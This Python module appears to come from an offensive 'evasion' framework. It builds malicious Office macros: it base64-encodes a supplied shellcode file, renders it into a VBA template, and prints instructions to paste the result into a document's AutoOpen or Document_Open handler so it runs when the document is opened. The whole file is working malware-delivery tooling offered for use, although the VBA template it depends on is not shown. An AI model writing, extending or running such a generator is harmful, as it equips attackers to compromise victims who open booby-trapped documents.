import os
from jinja2 import Environment, FileSystemLoader
from core import EvasionTechnique
from utils.obfuscator import base64_encode # Using base64 as per the vba template
from utils.helpers import get_output_path
from config import TEMPLATE_DIRS

class VBAMacro(EvasionTechnique):
    def __init__(self):
        super().__init__(
            name="vba-macro",
            description="Generates a VBA macro with embedded, base64-encoded shellcode for Office documents.",
            options=[
                {'name': '--payload', 'type': 'str', 'required': True, 'help': 'Path to the raw shellcode file.'},
                {'name': '--output', 'type': 'str', 'required': True, 'help': 'Name of the output VBA macro file (e.g., macro.vba).'}
            ]
        )

    def generate(self, **kwargs):
        payload_path = kwargs['payload']
        output_filename = kwargs['output']

        print(f"[*] Generating VBA Macro: Output=\'{output_filename}\'")

        # 1. Read shellcode
        try:
            with open(payload_path, 'rb') as f:
                shellcode = f.read()
        except FileNotFoundError:
            print(f"[!] Error: Payload file '{payload_path}' not found.")
            return
        except Exception as e:
            print(f"[!] Error reading payload file '{payload_path}': {e}")
            return

        if not shellcode:
            print(f"[!] Error: Payload file '{payload_path}' is empty.")
            return

        # 2. Obfuscate/Encode shellcode (Base64 for VBA)
        # The base64_encode function from obfuscator.py returns (encoded_data, None)
        encoded_shellcode_bytes, _ = base64_encode(shellcode)
        # The VBA template expects a string
        b64_shellcode_str = encoded_shellcode_bytes.decode('utf-8')
        print(f"[*] Shellcode Base64 encoded successfully.")

        # 3. Render VBA template
        env = Environment(loader=FileSystemLoader(TEMPLATE_DIRS), trim_blocks=True, lstrip_blocks=True)
        try:
            template = env.get_template("macro.vba") # Assuming template name is macro.vba in templates/vba/
            
            # The macro.vba template uses {{ payload_b64 }}
            # It also has a {{ shellcode_hex }} placeholder which might be for an alternative or unused path.
            # We will provide an empty string for shellcode_hex if not used, or a dummy value.
            # For now, focusing on payload_b64 as the primary method based on the template's decode function.
            vba_code = template.render(
                payload_b64=b64_shellcode_str,
                shellcode_hex="" # Provide empty or dummy if not used by the Base64 path
            )
        except Exception as e:
            print(f"[!] Error rendering VBA template (macro.vba): {e}")
            return

        # 4. Save the generated VBA code
        # The output path should be constructed using get_output_path
        final_output_path = get_output_path(output_filename)
        
        try:
            with open(final_output_path, 'w') as f:
                f.write(vba_code)
        except Exception as e:
            print(f"[!] Error writing VBA macro to file '{final_output_path}': {e}")
            return

        if os.path.exists(final_output_path):
            print(f"[SUCCESS] VBA Macro generated successfully: {final_output_path}")
            print(f"    Copy the content of this file into the VBA editor of an Office document (e.g., in AutoOpen or Document_Open).")
        else:
            print(f"[!] VBA Macro generation failed. Output file not found at {final_output_path}")
